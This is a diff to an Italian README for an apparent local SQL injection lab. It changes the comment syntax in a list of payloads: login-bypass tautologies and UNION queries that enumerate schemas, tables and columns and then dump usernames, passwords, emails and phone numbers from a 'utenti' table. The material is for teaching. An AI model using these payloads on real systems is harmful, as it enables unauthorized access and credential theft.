@@ -57,13 +57,13 @@ L'app sarà disponibile su `http://localhost:8080/login.html`
 
 Tautologia:
 ```
-Username: ' OR 1=1 #
+Username: ' OR 1=1 -- 
 Password: qualsiasi
 ```
 
 EOL Comment:
 ```
-Username: admin' #
+Username: admin' -- 
 Password: qualsiasi
 ```
 
@@ -79,32 +79,32 @@ Password: admin123
 
 Tautologia:
 ```
-' OR 1=1 #
+' OR 1=1 -- 
 ```
 
 Scoprire nome database:
 ```
-' UNION SELECT 'Nome database:', DATABASE(), '', '', '' #
+' UNION SELECT 'Nome database:', DATABASE(), '', '', '' -- 
 ```
 
 Elencare tutti gli schemi:
 ```
-' UNION SELECT schema_name, '', '', '', '' FROM information_schema.schemata #
+' UNION SELECT schema_name, '', '', '', '' FROM information_schema.schemata -- 
 ```
 
 Elencare tabelle:
 ```
-' UNION SELECT 'Nome tabella:', table_name, '', '', '' FROM information_schema.tables WHERE table_schema='sqli_project' #
+' UNION SELECT 'Nome tabella:', table_name, '', '', '' FROM information_schema.tables WHERE table_schema='sqli_project' -- 
 ```
 
 Elencare colonne:
 ```
-' UNION SELECT 'Nome colonna:', column_name, '', '', '' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_project' #
+' UNION SELECT 'Nome colonna:', column_name, '', '', '' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_project' -- 
 ```
 
 Leggere credenziali:
 ```
-'UNION SELECT 'ID', 'username', 'password', 'email', 'telefono' UNION SELECT id, username, password, email, telefono FROM utenti #
+'UNION SELECT 'ID', 'username', 'password', 'email', 'telefono' UNION SELECT id, username, password, email, telefono FROM utenti -- 
 ```
 
 Aggiornare un utente:
